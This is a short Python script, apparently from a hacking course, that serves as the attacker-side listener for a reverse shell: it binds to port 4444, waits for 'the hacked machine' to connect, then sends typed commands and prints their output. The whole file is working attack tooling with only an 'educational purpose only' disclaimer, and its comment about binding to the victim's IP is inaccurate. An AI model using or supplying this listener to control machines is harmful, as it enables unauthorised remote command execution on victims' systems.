#!/user/bin/env python
"""
Author：Seldon Pang

Listener for incoming connection from the hacked machine
Please use for educational purpose only...
"""

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Replace ip with the ip of the hacked machine
listener.bind(("192.168.1.23", 4444))
listener.listen(0)
print("[+] Waiting for incoming connection.")
connection, address = listener.accept()
print("[+] Got a connection from " + str(address))

while True:
    command = input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)
